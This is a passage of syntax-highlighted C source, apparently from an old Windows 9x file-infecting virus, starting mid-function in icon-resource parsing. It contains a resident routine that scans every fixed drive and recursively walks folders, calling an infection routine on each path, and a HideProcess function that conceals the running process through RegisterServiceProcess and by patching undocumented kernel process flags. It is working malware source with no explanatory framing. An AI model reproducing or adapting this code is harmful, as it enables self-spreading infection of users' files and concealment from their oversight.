  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">PIMAGE_OS2_HEADER</span><span class="sc10">)</span><span class="sc11">pNEorPE</span><span class="sc10">)-&gt;</span><span class="sc11">ne_magic</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">IMAGE_OS2_SIGNATURE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">PIMAGE_OS2_HEADER</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PIMAGE_OS2_HEADER</span><span class="sc10">)</span><span class="sc11">pNEorPE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">align</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">-&gt;</span><span class="sc11">ne_rsrctab</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">PRESOURCE_TYPE</span><span class="sc0">
      </span><span class="sc11">pRsrcType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PRESOURCE_TYPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">-&gt;</span><span class="sc11">ne_rsrctab</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">),</span><span class="sc0">
      </span><span class="sc11">pRsrcEnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PRESOURCE_TYPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pNE</span><span class="sc10">-&gt;</span><span class="sc11">ne_restab</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pRsrcType</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">pRsrcEnd</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">pRsrcType</span><span class="sc10">-&gt;</span><span class="sc11">ID</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pRsrcType</span><span class="sc10">-&gt;</span><span class="sc11">ID</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0x8000</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WORD</span><span class="sc10">)</span><span class="sc11">RT_ICON</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PRESOURCE_INFO</span><span class="sc0"> </span><span class="sc11">pRsrcInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PRESOURCE_INFO</span><span class="sc10">)(</span><span class="sc11">pRsrcType</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">PICONIMAGE</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Rva2Ptr</span><span class="sc10">(</span><span class="sc11">PICONIMAGE</span><span class="sc10">,</span><span class="sc0">
                                          </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0">
                                          </span><span class="sc11">pRsrcInfo</span><span class="sc10">++-&gt;</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">align</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biSize</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">BITMAPINFOHEADER</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
              </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biPlanes</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
              </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biBitCount</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                 </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biWidth</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                 </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biHeight</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">64</span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pSmallIcon</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                 </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biWidth</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                 </span><span class="sc11">pIconImage</span><span class="sc10">-&gt;</span><span class="sc11">icHeader</span><span class="sc10">.</span><span class="sc11">biHeight</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0">
              </span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pSmallIcon</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIconImage</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pLargeIcon</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">pIconImages</span><span class="sc10">-&gt;</span><span class="sc11">pSmallIcon</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">breakall</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">nCount</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">pRsrcType</span><span class="sc10">-&gt;</span><span class="sc11">count</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">pRsrcType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc11">PRESOURCE_TYPE</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">((</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">pRsrcType</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">RESOURCE_TYPE</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pRsrcType</span><span class="sc10">-&gt;</span><span class="sc11">count</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">RESOURCE_INFO</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">breakall</span><span class="sc10">:;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc9">#ifdef tsr
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">SeekTSR</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pszDrvs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pszDrive</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">uDriveType</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!(</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetLogicalDriveStrings</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
      </span><span class="sc10">!(</span><span class="sc11">pszDrvs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc10">)</span><span class="sc11">GlobalAlloc</span><span class="sc10">(</span><span class="sc11">LPTR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetLogicalDriveStrings</span><span class="sc10">(</span><span class="sc11">cBytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pszDrvs</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#if PREV_LAPSE
</span><span class="sc0">    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc11">PREV_LAPSE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">pszDrive</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pszDrvs</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">uDriveType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDriveType</span><span class="sc10">(</span><span class="sc11">pszDrive</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">DRIVE_REMOVABLE</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
            </span><span class="sc11">uDriveType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_CDROM</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CancelFolderSeek</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc11">CancelFolderSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc11">WalkFolder</span><span class="sc10">(</span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pszDrive</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">pszDrive</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">pszDrive</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CancelFolderSeek</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hMutex</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#if 1
</span><span class="sc0">    </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TSR: Mutex destroyed!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">  </span><span class="sc11">GlobalFree</span><span class="sc10">(</span><span class="sc11">pszDrvs</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">WalkFolder</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFindFile</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc11">SEEK_LAPSE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">cBytes</span><span class="sc10">++]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\\'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*(</span><span class="sc11">PDWORD</span><span class="sc10">)(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'*.*'</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hFindFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindDataTSR</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0">
        </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">CancelFolderSeek</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">IsFolder</span><span class="sc10">(&amp;</span><span class="sc11">FindDataTSR</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindDataTSR</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WalkFolder</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">);</span><span class="sc0">                            </span><span class="sc2">//recurse folders..
</span><span class="sc0">  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindDataTSR</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFindFile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//VOID HideProcess() {                               //Unsecure way to
//  PTHREAD_DATABASE pThreadDB = GetThreadDB();      //hide our process.
//  if (pThreadDB-&gt;pProcess-&gt;Type != K32OBJ_PROCESS) //This is undocumented
//    return;                                        //Microsoft stuff,
//  pThreadDB-&gt;pProcess-&gt;flags |= fServiceProcess;   //likely to GP fault!
//}                                                  //Code bellow is better
</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">HideProcess</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//do it the legal undoc. way..
</span><span class="sc0">    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pfnRegisterServiceProcess</span><span class="sc10">)(</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pfnRegisterServiceProcess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
      </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc10">*)(</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc6">"KERNEL32"</span><span class="sc10">),</span><span class="sc0">
                       </span><span class="sc6">"RegisterServiceProcess"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pfnRegisterServiceProcess</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc11">pfnRegisterServiceProcess</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//do it the ilegal dirty way, just in case..
</span><span class="sc0">    </span><span class="sc11">PPROCESS_DATABASE</span><span class="sc0"> </span><span class="sc11">pProcessDB</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetProcessDB</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetCurrentProcess</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nBytes</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">ReadProcessMemory</span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pProcessDB</span><span class="sc10">-&gt;</span><span class="sc11">Type</span><span class="sc10">,</span><span class="sc0">
                           </span><span class="sc10">&amp;</span><span class="sc11">dwBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">nBytes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">dwBuffer</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">K32OBJ_PROCESS</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">!</span><span class="sc11">ReadProcessMemory</span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pProcessDB</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">,</span><span class="sc0">
                           </span><span class="sc10">&amp;</span><span class="sc11">dwBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">nBytes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">dwBuffer</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc11">fServiceProcess</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WriteProcessMemory</span><span class="sc10">(</span><span class="sc11">hProcess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pProcessDB</span><span class="sc10">-&gt;</span><span class="sc11">flags</span><span class="sc10">,</span><span class="sc0">
                       </span><span class="sc10">&amp;</span><span class="sc11">dwBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nBytes</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">PPROCESS_DATABASE</span><span class="sc0"> </span><span class="sc11">GetProcessDB</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PPROCESS_DATABASE</span><span class="sc0"> </span><span class="sc11">pProcessDB</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nBytes</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">ReadProcessMemory</span><span class="sc10">(</span><span class="sc11">GetCurrentProcess</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">GetThreadDB</span><span class="sc10">()-&gt;</span><span class="sc11">pProcess</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc10">&amp;</span><span class="sc11">pProcessDB</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nBytes</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
          </span><span class="sc11">nBytes</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">pProcessDB</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">PTHREAD_DATABASE</span><span class="sc0"> </span><span class="sc11">GetThreadDB</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc11">push</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">10h</span><span class="sc0">
  </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc11">pop</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc0">
  </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc11">add</span><span class="sc0"> </span><span class="sc11">eax</span><span class="sc10">,</span><span class="sc11">fs</span><span class="sc10">:[</span><span class="sc11">TIB</span><span class="sc10">.</span><span class="sc11">ptibSelf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">eax</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">10h</span><span class="sc10">)]</span><span class="sc0">  </span><span class="sc2">//(eax + 10h) = 0
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc2">//end
</span></div></body>
</html>
